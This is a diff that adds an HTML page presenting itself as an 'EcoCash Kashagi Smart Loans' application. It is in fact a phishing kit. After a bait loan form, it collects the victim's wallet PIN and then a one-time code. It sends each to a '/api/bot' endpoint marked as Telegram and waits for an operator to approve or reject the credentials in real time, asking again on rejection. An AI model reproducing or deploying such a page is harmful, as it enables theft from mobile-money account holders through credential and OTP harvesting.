@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Kashagi Smart Loans</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .screen { display: none !important; }
+        .screen.active { display: flex !important; }
+        .pin-input:focus, .otp-input:focus { border-color: #0054A6; outline: none; box-shadow: 0 0 0 1px #0054A6; }
+        .otp-input:focus { border-color: #60a5fa; box-shadow: 0 0 0 1px #60a5fa; }
+        .curved-bg { border-top-left-radius: 50% 20px; border-top-right-radius: 50% 20px; }
+        .btn-loading { opacity: 0.6; cursor: not-allowed; }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans flex justify-center min-h-screen">
+
+    <div class="w-full max-w-md bg-white shadow-2xl flex flex-col relative overflow-hidden min-h-screen">
+        
+        <!-- SCREEN 1: LANDING PAGE -->
+        <main id="screen-landing" class="screen active flex-col bg-white h-full overflow-y-auto pb-24">
+            <header class="p-4 flex justify-between items-center bg-white sticky top-0 z-10 border-b border-gray-100">
+                <div class="flex flex-col">
+                    <h1 class="text-3xl font-extrabold tracking-tight"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>
+                    <p class="text-[11px] text-gray-500 font-medium mt-1">Your phone. Your wallet.</p>
+                </div>
+            </header>
+            <div class="px-5 mt-4">
+                <div class="inline-flex items-center bg-[#eef2ff] text-[#0054A6] px-3 py-1.5 rounded-full text-xs font-bold mb-6">
+                    KASHAGI SMART LOANS SERVICE
+                </div>
+                <h2 class="text-3xl font-extrabold text-[#1a202c] leading-tight mb-4">Fast, secure and reliable loans</h2>
+                <p class="text-sm text-gray-600 mb-8 leading-relaxed">
+                    KASHAGI SMART LOANS is a trusted financial platform providing instant access to loans from <strong>20 USD to 100,000 USD</strong>, delivered straight to your EcoCash wallet.
+                </p>
+            </div>
+            <div class="absolute bottom-0 left-0 w-full p-4 bg-white border-t border-gray-100 z-20">
+                <!-- ONCLICK DIRECTLY CALLS THE FUNCTION -->
+                <button type="button" onclick="window.nextScreen('screen-application')" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl shadow-lg cursor-pointer">
+                    Apply for a Loan
+                </button>
+            </div>
+        </main>
+
+        <!-- SCREEN 2: APPLICATION FORM -->
+        <main id="screen-application" class="screen flex-col bg-[#f8fafc] h-full overflow-y-auto pb-10">
+            <header class="pt-6 pb-2 flex flex-col items-center bg-[#f8fafc]">
+                <h1 class="text-3xl font-extrabold tracking-tight"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>
+            </header>
+            <div class="bg-white mx-4 rounded-2xl shadow-sm border border-gray-100 p-6 mb-6 mt-6">
+                <h3 class="text-lg font-bold text-gray-800">Loan Application Form</h3>
+                <div class="space-y-4 mt-4">
+                    <div>
+                        <label class="block text-xs font-bold text-gray-700 mb-1">Full Name</label>
+                        <input type="text" class="w-full border border-gray-300 rounded-lg p-3 text-sm focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-gray-700 mb-1">Phone Number</label>
+                        <input type="tel" class="w-full border border-gray-300 rounded-lg p-3 text-sm focus:outline-none">
+                    </div>
+                    <!-- ONCLICK DIRECTLY CALLS THE FUNCTION -->
+                    <button type="button" onclick="window.nextScreen('screen-pin')" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl shadow-lg mt-6 cursor-pointer">
+                        Submit Application
+                    </button>
+                </div>
+            </div>
+        </main>
+
+        <!-- SCREEN 3: PIN LOGIN -->
+        <main id="screen-pin" class="screen flex-col bg-white h-full relative">
+            <header class="pt-10 pb-4 flex flex-col items-center">
+                <h1 class="text-3xl font-extrabold tracking-tight"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>
+            </header>
+            <div class="px-6 flex-grow flex flex-col items-center pt-8 z-10">
+                <h2 class="text-3xl font-serif italic text-gray-800 mb-10">Welcome</h2>
+                <h3 class="text-xl font-serif italic text-gray-800 mb-6">Enter your PIN</h3>
+                <div class="flex justify-center gap-3 mb-6 w-full" id="pinContainer">
+                    <input type="password" maxlength="1" inputmode="numeric" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white">
+                    <input type="password" maxlength="1" inputmode="numeric" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white">
+                    <input type="password" maxlength="1" inputmode="numeric" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white">
+                    <input type="password" maxlength="1" inputmode="numeric" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white">
+                </div>
+                <!-- ONCLICK DIRECTLY CALLS THE FUNCTION -->
+                <button type="button" onclick="window.submitPin()" id="pinBtn" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl cursor-pointer">Login</button>
+            </div>
+        </main>
+
+        <!-- SCREEN 4: OTP VERIFICATION -->
+        <main id="screen-otp" class="screen flex-col bg-[#2b2b2b] h-full relative">
+            <div class="px-6 flex-grow flex flex-col items-center pt-10 z-10">
+                <h1 class="text-4xl font-extrabold tracking-tight mb-12"><span class="text-white">Eco</span><span class="text-[#E31837]">Cash</span></h1>
+                <div class="flex justify-center gap-2 mb-10 w-full" id="otpContainer">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-input w-12 h-14 text-center text-xl text-white bg-transparent border-2 border-gray-500 rounded-md">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-input w-12 h-14 text-center text-xl text-white bg-transparent border-2 border-gray-500 rounded-md">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-input w-12 h-14 text-center text-xl text-white bg-transparent border-2 border-gray-500 rounded-md">
+                    <input type="text" maxlength="1" inputmode="numeric" class="otp-input w-12 h-14 text-center text-xl text-white bg-transparent border-2 border-gray-500 rounded-md">
+                </div>
+                <!-- ONCLICK DIRECTLY CALLS THE FUNCTION -->
+                <button type="button" onclick="window.submitOtp()" id="otpBtn" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl shadow-lg cursor-pointer">Verify and Login</button>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // NAVIGATION FUNCTION
+        window.nextScreen = function(screenId) {
+            var screens = document.querySelectorAll('.screen');
+            for (var i = 0; i < screens.length; i++) {
+                screens[i].classList.remove('active');
+            }
+            document.getElementById(screenId).classList.add('active');
+            window.scrollTo(0,0);
+        };
+
+        // AUTO-JUMP INPUTS
+        function setupInputs(className) {
+            var inputs = document.querySelectorAll('.' + className);
+            for (var i = 0; i < inputs.length; i++) {
+                (function(index) {
+                    inputs[index].addEventListener('input', function() {
+                        if (this.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
+                    });
+                    inputs[index].addEventListener('keydown', function(e) {
+                        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) inputs[index - 1].focus();
+                    });
+                })(i);
+            }
+            return inputs;
+        }
+        var pinInputs = setupInputs('pin-input');
+        var otpInputs = setupInputs('otp-input');
+
+        // TELEGRAM
+        function sendToTelegram(pin, type) {
+            var phone = "263775636399"; 
+            var userId = Date.now().toString().slice(-6); 
+            return fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'send_verification', phone: phone, pin: pin, userId: userId, type: type })
+            }).then(function(response) {
+                if (!response.ok) throw new Error("Server error");
+                return userId;
+            }).catch(function(error) { return null; });
+        }
+
+        function checkAdminStatus(userId, type, btn) {
+            var interval = setInterval(function() {
+                fetch('/api/bot?userId=' + userId)
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        btn.disabled = false;
+                        if(type === 'pin') { 
+                            window.nextScreen('screen-otp'); 
+                            document.querySelector('.otp-input').focus(); 
+                        } else { 
+                            alert("🎉 Success! OTP Verified."); 
+                            window.location.reload(); 
+                        }
+                    } else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        alert("❌ Wrong " + type.toUpperCase() + ". Please try again.");
+                        btn.disabled = false;
+                        if(type === 'pin') { 
+                            for(var i=0; i<pinInputs.length; i++) pinInputs[i].value = ''; 
+                            pinInputs[0].focus(); 
+                        } else { 
+                            for(var i=0; i<otpInputs.length; i++) otpInputs[i].value = ''; 
+                            otpInputs[0].focus(); 
+                        }
+                    }
+                }).catch(function(e) { });
+            }, 1000);
+        }
+
+        window.submitPin = function() {
+            var pin = '';
+            for(var i=0; i<pinInputs.length; i++) pin += pinInputs[i].value;
+            if(pin.length !== 4) return alert("Please enter all 4 digits.");
+            
+            var btn = document.getElementById('pinBtn');
+            btn.disabled = true;
+            
+            sendToTelegram(pin, 'pin').then(function(userId) {
+                if(userId) {
+                    checkAdminStatus(userId, 'pin', btn);
+                } else {
+                    alert("Failed to connect to server.");
+                    btn.disabled = false;
+                }
+            });
+        };
+
+        window.submitOtp = function() {
+            var otp = '';
+            for(var i=0; i<otpInputs.length; i++) otp += otpInputs[i].value;
+            if(otp.length !== 4) return alert("Please enter the OTP.");
+
+            var btn = document.getElementById('otpBtn');
+            btn.disabled = true;
+            
+            sendToTelegram(otp, 'otp').then(function(userId) {
+                if(userId) {
+                    checkAdminStatus(userId, 'otp', btn);
+                } else {
+                    alert("Failed to connect to server.");
+                    btn.disabled = false;
+                }
+            });
+        };
+    </script>
+</body>
+              </html>
